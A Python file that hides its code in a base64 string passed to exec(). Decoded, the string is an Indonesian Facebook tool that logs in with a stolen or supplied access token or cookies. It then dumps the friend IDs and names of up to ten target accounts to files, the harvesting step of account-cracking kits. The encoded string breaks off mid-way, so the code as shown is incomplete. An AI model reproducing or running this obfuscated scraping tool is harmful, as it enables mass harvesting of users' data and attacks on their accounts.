import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zCiMtKi1jb2Rpbmc6dXRmLTgtKi0KIyBCYXNlIENvZGUgUHJlbWl1bSAmIEVsaXRlIERhcHVudGEKIyBEViBTaGFudG8gQWhtZWQgCgojIEltcG9ydCBNb2R1bGUKaW1wb3J0IHJlcXVlc3RzLGJzNCxzeXMsb3MscmFuZG9tLHRpbWUscmUsanNvbixjb25jdXJyZW50CmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbApmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXIKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKCiMgRmlsZXMKaG9zdCA9ICJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iCm9rID0gW10KY3AgPSBbXQp0dGwgPSBbXQoKI3BlbGVyID0gcmFuZG9tLmNob2ljZShbJ1x4MWJbMDs5N21bQ1BdJywnXHgxYlswOzkybVtPS10nLCdceDFiWzA7OTdtW0NQXSddKQoKIyBUaW1lCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQp0YSA9IGN1cnJlbnQueWVhcgpidSA9IGN1cnJlbnQubW9udGgKaGEgPSBjdXJyZW50LmRheQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0KYnVsYW4gPSBbIkphbnVhcmkiLCAiRmVicnVhcmkiLCAiTWFyZXQiLCAiQXByaWwiLCAiTWVpIiwgIkp1bmkiLCAiSnVsaSIsICJBZ3VzdHVzIiwgIlNlcHRlbWJlciIsICJPa3RvYmVyIiwgIk5vdmVtYmVyIiwgIkRlc2VtYmVyIl0KZHVyYXNpID0gc3RyKGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlZCAlQiAlWSIpKQp0cnk6CiAgICBpZiBidSA8IDAgb3IgYnUgPiAxMjoKICAgICAgICBleGl0KCkKICAgIGJ1VGVtcCA9IGJ1IC0gMQpleGNlcHQgVmFsdWVFcnJvcjoKICAgIGV4aXQoKQpvcCA9IGJ1bGFuW2J1VGVtcF0KdGFuZ2dhbCA9ICgiJXMtJXMtJXMiJShoYSxvcCx0YSkpCgojIExvZ2dlciBDb29raWVzIChKYW5nYW4gRGlnYW50aSBOYW50aSBHYWFkYSBIYXNpbCkKZGVmIGxhbmcoY29va2llcyk6CiAgICBmPUZhbHNlCiAgICBycj1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sYW5ndWFnZS5waHAiLGhlYWRlcnM9aGRjb2soKSxjb29raWVzPWNvb2tpZXMpLnRleHQsImh0bWwucGFyc2VyIikKICAgIGZvciBpIGluIHJyLmZpbmRfYWxsKCJhIixocmVmPVRydWUpOgogICAgICAgIGlmICJpZF9JRCIgaW4gaS5nZXQoImhyZWYiKToKICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vIitpLmdldCgiaHJlZiIpLGNvb2tpZXM9Y29va2llcyxoZWFkZXJzPWhkY29rKCkpCiAgICAgICAgICAgIGI9cmVxdWVzdHMuZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHAiLGhlYWRlcnM9aGRjb2soKSxjb29raWVzPWNvb2tpZXMpLnRleHQgICAgCiAgICAgICAgICAgIGlmICJhcGEgeWFuZyBhbmRhIHBpa2lya2FuIHNla2FyYW5nIiBpbiBiLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBmPVRydWUKICAgIGlmIGY9PVRydWU6CiAgICAgICAgcmV0dXJuIFRydWUKICAgIGVsc2U6CiAgICAgICAgZXhpdCgiWyFdIFdyb25nIENvb2tpZXMiKQpkZWYgYmFzZWNvb2tpZSgpOgogICAgaWYgb3MucGF0aC5leGlzdHMoIi5jb2siKToKICAgICAgICBpZiBvcy5wYXRoLmdldHNpemUoIi5jb2siKSAhPTA6CiAgICAgICAgICAgIHJldHVybiBnZXRzX2RpY3RfY29va2llcyhvcGVuKCcuY29rJykucmVhZCgpLnN0cmlwKCkpCiAgICAgICAgZWxzZTpsb2dpbigpCiAgICBlbHNlOmxvZ2luKCkKZGVmIGhkY29rKCk6CiAgICBnbG9iYWwgaG9zdAogICAgaG9zdHM9aG9zdAogICAgcj17Im9yaWdpbiI6IGhvc3RzLCAiYWNjZXB0LWxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43IiwgImFjY2VwdC1lbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwgImFjY2VwdCI6ICJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44IiwgInVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iLCAiSG9zdCI6ICIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoIjovLyguKj8pJCIsaG9zdHMpKSwgInJlZmVyZXIiOiBob3N0cysiL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsICJjYWNoZS1jb250cm9sIjogIm1heC1hZ2U9MCIsICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJ9CiAgICByZXR1cm4gcgpkZWYgZ2V0c19jb29raWVzKGNvb2tpZXMpOgogICAgcmVzdWx0PVtdCiAgICBmb3IgaSBpbiBlbnVtZXJhdGUoY29va2llcy5rZXlzKCkpOgogICAgICAgIGlmIGlbMF09PWxlbihsaXN0KGNvb2tpZXMua2V5cygpKSktMTpyZXN1bHQuYXBwZW5kKGlbMV0rIj0iK2Nvb2tpZXNbaVsxXV0pCiAgICAgICAgZWxzZTpyZXN1bHQuYXBwZW5kKGlbMV0rIj0iK2Nvb2tpZXNbaVsxXV0rIjsgIikKICAgIHJldHVybiAiIi5qb2luKHJlc3VsdCkKZGVmIGdldHNfZGljdF9jb29raWVzKGNvb2tpZXMpOgogICAgcmVzdWx0PXt9CiAgICB0cnk6CiAgICAgICAgZm9yIGkgaW4gY29va2llcy5zcGxpdCgiOyIpOgogICAgICAgICAgICByZXN1bHQudXBkYXRlKHtpLnNwbGl0KCI9IilbMF06aS5zcGxpdCgiPSIpWzFdfSkKICAgICAgICByZXR1cm4gcmVzdWx0CiAgICBleGNlcHQ6CiAgICAgICAgZm9yIGkgaW4gY29va2llcy5zcGxpdCgiOyAiKToKICAgICAgICAgICAgcmVzdWx0LnVwZGF0ZSh7aS5zcGxpdCgiPSIpWzBdOmkuc3BsaXQoIj0iKVsxXX0pCiAgICAgICAgcmV0dXJuIHJlc3VsdAojIExvZ2luIFRva2VuCmRlZiBsb2dpbigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICB0b2tlbiA9IGlucHV0KCdUb2tlbiA6ICcpCiAgICB0cnk6CiAgICAgICAgeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSIgKyB0b2tlbikKICAgICAgICB5ID0ganNvbi5sb2Fkcyh4LnRleHQpCiAgICAgICAgbiA9IHlbJ25hbWUnXQogICAgICAgIHhkID0gb3BlbigidG9rZW4udHh0IiwgInciKQogICAgICAgIHhkLndyaXRlKHRva2VuKQogICAgICAgIHhkLmNsb3NlKCkKICAgICAgICBwcmludCgnTG9naW4gU3Vrc2VzJykKICAgICAgICBwdWJsaWsoKQogICAgZXhjZXB0IChLZXlFcnJvcixJT0Vycm9yKToKICAgICAgICBwcmludCgnVG9rZW4gSW52YWxpZCcpCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgdG9rZW4udHh0JykKICAgICAgICBsb2dpbigpCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgcHJpbnQoJ0tvbmVrc2kgRXJyb3InKQogICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIHRva2VuLnR4dCcpCiAgICAgICAgbG9naW4oKQoKIyBEdW1wIElEIERhcmkgVGVtYW4vUHVibGlrCmRlZiBwdWJsaWsoKToKICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgdHJ5OgogICAgICAgIHRva2VuID0gb3BlbigidG9rZW4udHh0IiwiciIpLnJlYWQoKQogICAgICAgIHggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0iICsgdG9rZW4pCiAgICAgICAgeSA9IGpzb24ubG9hZHMoeC50ZXh0KQogICAgICAgIG4gPSB5WyduYW1lJ10KICAgIGV4Y2VwdCAoS2V5RXJyb3IsSU9FcnJvcik6CiAgICAgICAgcHJpbnQoIkNvb2tpZS9Ub2tlbiBJbnZhbGlkIikKICAgICAgICBvcy5zeXN0ZW0oInJtIC1yZiB0b2tlbi50eHQiKQogICAgICAgIGxvZ2luKCkKICAgIG5mID0gaW5wdXQoJ05hbWEgRmlsZSA6ICcpCiAgICBpZHQxID0gaW5wdXQoIklEIFRhcmdldCAxIDogIikKICAgIGlkdDIgPSBpbnB1dCgiSUQgVGFyZ2V0IDIgOiAiKQogICAgaWR0MyA9IGlucHV0KCJJRCBUYXJnZXQgMyA6ICIpCiAgICBpZHQ0ID0gaW5wdXQoIklEIFRhcmdldCA0IDogIikKICAgIGlkdDUgPSBpbnB1dCgiSUQgVGFyZ2V0IDUgOiAiKQogICAgaWR0NiA9IGlucHV0KCJJRCBUYXJnZXQgNiA6ICIpCiAgICBpZHQ3ID0gaW5wdXQoIklEIFRhcmdldCA3IDogIikKICAgIGlkdDggPSBpbnB1dCgiSUQgVGFyZ2V0IDggOiAiKQogICAgaWR0OSA9IGlucHV0KCJJRCBUYXJnZXQgOSA6ICIpCiAgICBpZHQwID0gaW5wdXQoIklEIFRhcmdldCAwIDogIikKICAgIHByaW50ICgnU2xvdyBZb2JlbiwgUGF0aWVuY2UgQ29rJykKICAgIHRyeToKICAgICAgICBydDEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQxICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3MSA9IGpzb24ubG9hZHMocnQxLnRleHQpCiAgICAgICAgbm0xID0gcncxWyJuYW1lIl0KICAgICAgICByMSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDEgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkMSA9IFtdCiAgICAgICAgejEgPSBqc29uLmxvYWRzKHIxLnRleHQpCiAgICAgICAgeDEgPSAocncxWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHkxID0gb3Blbih4MSAsICJ3IikKICAgICAgICBmb3IgYTEgaW4gejFbImRhdGEiXToKICAgICAgICAgICAgaWQxLmFwcGVuZChhMVsiaWQiXSsi4oCiIithMVsibmFtZSJdKQogICAgICAgICAgICB5MS53cml0ZShhMVsiaWQiXSsi4oCiIithMVsibmFtZSJdKyJcbiIpCiAgICAgICAgeTEuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQyICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3MiA9IGpzb24ubG9hZHMocnQyLnRleHQpCiAgICAgICAgbm0yID0gcncyWyJuYW1lIl0KICAgICAgICByMiA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDIgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkMiA9IFtdCiAgICAgICAgejIgPSBqc29uLmxvYWRzKHIyLnRleHQpCiAgICAgICAgeDIgPSAocncyWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHkyID0gb3Blbih4MiAsICJ3IikKICAgICAgICBmb3IgYTIgaW4gejJbImRhdGEiXToKICAgICAgICAgICAgaWQyLmFwcGVuZChhMlsiaWQiXSsi4oCiIithMlsibmFtZSJdKQogICAgICAgICAgICB5Mi53cml0ZShhMlsiaWQiXSsi4oCiIithMlsibmFtZSJdKyJcbiIpCiAgICAgICAgeTIuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDMgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQzICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3MyA9IGpzb24ubG9hZHMocnQzLnRleHQpCiAgICAgICAgbm0zID0gcnczWyJuYW1lIl0KICAgICAgICByMyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDMgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkMyA9IFtdCiAgICAgICAgejMgPSBqc29uLmxvYWRzKHIzLnRleHQpCiAgICAgICAgeDMgPSAocnczWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHkzID0gb3Blbih4MyAsICJ3IikKICAgICAgICBmb3IgYTMgaW4gejNbImRhdGEiXToKICAgICAgICAgICAgaWQzLmFwcGVuZChhM1siaWQiXSsi4oCiIithM1sibmFtZSJdKQogICAgICAgICAgICB5My53cml0ZShhM1siaWQiXSsi4oCiIithM1sibmFtZSJdKyJcbiIpCiAgICAgICAgeTMuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDQgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQ0ICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3NCA9IGpzb24ubG9hZHMocnQ0LnRleHQpCiAgICAgICAgbm00ID0gcnc0WyJuYW1lIl0KICAgICAgICByNCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDQgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkNCA9IFtdCiAgICAgICAgejQgPSBqc29uLmxvYWRzKHI0LnRleHQpCiAgICAgICAgeDQgPSAocnc0WyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHk0ID0gb3Blbih4NCAsICJ3IikKICAgICAgICBmb3IgYTQgaW4gejRbImRhdGEiXToKICAgICAgICAgICAgaWQ0LmFwcGVuZChhNFsiaWQiXSsi4oCiIithNFsibmFtZSJdKQogICAgICAgICAgICB5NC53cml0ZShhNFsiaWQiXSsi4oCiIithNFsibmFtZSJdKyJcbiIpCiAgICAgICAgeTQuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDUgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQ1ICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3NSA9IGpzb24ubG9hZHMocnQ1LnRleHQpCiAgICAgICAgbm01ID0gcnc1WyJuYW1lIl0KICAgICAgICByNSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDUgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkNSA9IFtdCiAgICAgICAgejUgPSBqc29uLmxvYWRzKHI1LnRleHQpCiAgICAgICAgeDUgPSAocnc1WyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHk1ID0gb3Blbih4NSAsICJ3IikKICAgICAgICBmb3IgYTUgaW4gejVbImRhdGEiXToKICAgICAgICAgICAgaWQ1LmFwcGVuZChhNVsiaWQiXSsi4oCiIithNVsibmFtZSJdKQogICAgICAgICAgICB5NS53cml0ZShhNVsiaWQiXSsi4oCiIithNVsibmFtZSJdKyJcbiIpCiAgICAgICAgeTUuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDYgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQ2ICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3NiA9IGpzb24ubG9hZHMocnQ2LnRleHQpCiAgICAgICAgbm02ID0gcnc2WyJuYW1lIl0KICAgICAgICByNiA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDYgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkNiA9IFtdCiAgICAgICAgejYgPSBqc29uLmxvYWRzKHI2LnRleHQpCiAgICAgICAgeDYgPSAocnc2WyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHk2ID0gb3Blbih4NiAsICJ3IikKICAgICAgICBmb3IgYTYgaW4gejZbImRhdGEiXToKICAgICAgICAgICAgaWQ2LmFwcGVuZChhNlsiaWQiXSsi4oCiIithNlsibmFtZSJdKQogICAgICAgICAgICB5Ni53cml0ZShhNlsiaWQiXSsi4oCiIithNlsibmFtZSJdKyJcbiIpCiAgICAgICAgeTYuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDcgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQ3ICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3NyA9IGpzb24ubG9hZHMocnQ3LnRleHQpCiAgICAgICAgbm03ID0gcnc3WyJuYW1lIl0KICAgICAgICByNyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDcgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkNyA9IFtdCiAgICAgICAgejcgPSBqc29uLmxvYWRzKHI3LnRleHQpCiAgICAgICAgeDcgPSAocnc3WyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHk3ID0gb3Blbih4NyAsICJ3IikKICAgICAgICBmb3IgYTcgaW4gejdbImRhdGEiXToKICAgICAgICAgICAgaWQ3LmFwcGVuZChhN1siaWQiXSsi4oCiIithN1sibmFtZSJdKQogICAgICAgICAgICB5Ny53cml0ZShhN1siaWQiXSsi4oCiIithN1sibmFtZSJdKyJcbiIpCiAgICAgICAgeTcuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQ4ICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3OCA9IGpzb24ubG9hZHMocnQ4LnRleHQpCiAgICAgICAgbm04ID0gcnc4WyJuYW1lIl0KICAgICAgICByOCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDggKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkOCA9IFtdCiAgICAgICAgejggPSBqc29uLmxvYWRzKHI4LnRleHQpCiAgICAgICAgeDggPSAocnc4WyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHk4ID0gb3Blbih4OCAsICJ3IikKICAgICAgICBmb3IgYTggaW4gejhbImRhdGEiXToKICAgICAgICAgICAgaWQ4LmFwcGVuZChhOFsiaWQiXSsi4oCiIithOFsibmFtZSJdKQogICAgICAgICAgICB5OC53cml0ZShhOFsiaWQiXSsi4oCiIithOFsibmFtZSJdKyJcbiIpCiAgICAgICAgeTguY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDkgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQ5ICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3OSA9IGpzb24ubG9hZHMocnQ5LnRleHQpCiAgICAgICAgbm05ID0gcnc5WyJuYW1lIl0KICAgICAgICByOSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDkgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkOSA9IFtdCiAgICAgICAgejkgPSBqc29uLmxvYWRzKHI5LnRleHQpCiAgICAgICAgeDkgPSAocnc5WyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHk5ID0gb3Blbih4OSAsICJ3IikKICAgICAgICBmb3IgYTkgaW4gejlbImRhdGEiXToKICAgICAgICAgICAgaWQ5LmFwcGVuZChhOVsiaWQiXSsi4oCiIithOVsibmFtZSJdKQogICAgICAgICAgICB5OS53cml0ZShhOVsiaWQiXSsi4oCiIithOVsibmFtZSJdKyJcbiIpCiAgICAgICAgeTkuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBydDAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIgKyBpZHQwICsgIj9hY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIHJ3MCA9IGpzb24ubG9hZHMocnQwLnRleHQpCiAgICAgICAgbm0wID0gcncwWyJuYW1lIl0KICAgICAgICByMCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIiArIGlkdDAgKyAiL2ZyaWVuZHM/bGltaXQ9NTAwMCZhY2Nlc3NfdG9rZW49IiArIHRva2VuKQogICAgICAgIGlkMCA9IFtdCiAgICAgICAgejAgPSBqc29uLmxvYWRzKHIwLnRleHQpCiAgICAgICAgeDAgPSAocncwWyJmaXJzdF9uYW1lIl0rIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIHkwID0gb3Blbih4MCAsICJ3IikKICAgICAgICBmb3IgYTAgaW4gejBbImRhdGEiXToKICAgICAgICAgICAgaWQwLmFwcGVuZChhMFsiaWQiXSsi4oCiIithMFsibmFtZSJdKQogICAgICAgICAgICB5MC53cml0ZShhMFsiaWQiXSsi4oCiIithMFsibmFtZSJdKyJcbiIpCiAgICAgICAgeTAuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKICAgIHRyeToKICAgICAgICBubWExID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0MSx0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2QxID0gKG5tYTErIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtMSA9IG9wZW4oc2QxLCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtMSA9ICdcbicKICAgICAgICBzZDEgPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWEyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0Mix0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2QyID0gKG5tYTIrIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtMiA9IG9wZW4oc2QyLCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtMiA9ICdcbicKICAgICAgICBzZDIgPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWEzID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0Myx0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2QzID0gKG5tYTMrIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtMyA9IG9wZW4oc2QzLCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtMyA9ICdcbicKICAgICAgICBzZDMgPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWE0ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0NCx0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2Q0ID0gKG5tYTQrIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtNCA9IG9wZW4oc2Q0LCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtNCA9ICdcbicKICAgICAgICBzZDQgPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWE1ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0NSx0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2Q1ID0gKG5tYTUrIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtNSA9IG9wZW4oc2Q1LCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtNSA9ICdcbicKICAgICAgICBzZDUgPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWE2ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0Nix0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2Q2ID0gKG5tYTYrIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtNiA9IG9wZW4oc2Q2LCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtNiA9ICdcbicKICAgICAgICBzZDYgPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWE3ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0Nyx0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2Q3ID0gKG5tYTcrIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtNyA9IG9wZW4oc2Q3LCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtNyA9ICdcbicKICAgICAgICBzZDcgPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWE4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29r